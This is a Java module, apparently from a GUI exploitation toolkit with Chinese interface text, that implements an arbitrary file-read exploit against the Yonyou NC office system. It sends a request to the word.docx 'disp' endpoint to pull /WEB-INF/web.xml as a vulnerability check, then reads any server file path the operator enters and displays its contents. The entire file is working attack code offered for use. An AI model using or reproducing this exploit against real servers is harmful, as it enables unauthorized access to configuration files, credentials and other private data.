package exp.oa.yongyou.nc;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;

import java.util.HashMap;

public class yongyou_nc_worddoxc_FileRead implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea,textArea_cmd);
    }

    @Override
    public Boolean checkVulCmd(String url, String cmd, TextArea textArea, TextArea textArea_cmd) {
        return attcmd(url,cmd, textArea,textArea_cmd);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        Platform.runLater(() -> {
            textArea.appendText("\n 不支持getshell功能");
        });
        return false;
    }

    private Boolean att(String url, TextArea textArea, TextArea textArea_cmd) {

        try {
            HashMap<String, String> head = new HashMap<>();
            Response get_res = HttpTools.get(url + "/portal/docctr/open/word.docx?disp=/WEB-INF/web.xml", head, "utf-8");
            if (get_res.getCode() == 200 && get_res.getText().contains("<?xml version")&&!get_res.getText().contains("未授权访问")) {
                Platform.runLater(() -> {
                    textArea.appendText("\n [ yongyou_nc_worddoxc_FileRead ]");
                    textArea.appendText("\n 输入文件名进行读取");
                    textArea.appendText("\n eg: /WEB-INF/web.xml");
                    textArea.appendText("\n");
                    textArea_cmd.appendText("\n -------------"+"/WEB-INF/web.xml"+"--------------\n"+get_res.getText()+"\n");
                });


                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n");
                });
                return false;
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }


    private Boolean attcmd(String url, String cmd, TextArea textArea,TextArea textArea_cmd) {

        try {
            Response get_res = HttpTools.get(url + "/portal/docctr/open/word.docx?disp="+cmd, new HashMap<>(), "utf-8");

            if (get_res.getCode() == 200) {
                Platform.runLater(() -> {
                    textArea.appendText("\n "+ cmd +" 读取成功！");
                    textArea_cmd.appendText("\n -------------"+cmd+"--------------\n"+get_res.getText()+"\n");
                });
                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n "+ cmd +" 读取失败！");
                });
                return false;
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }
}
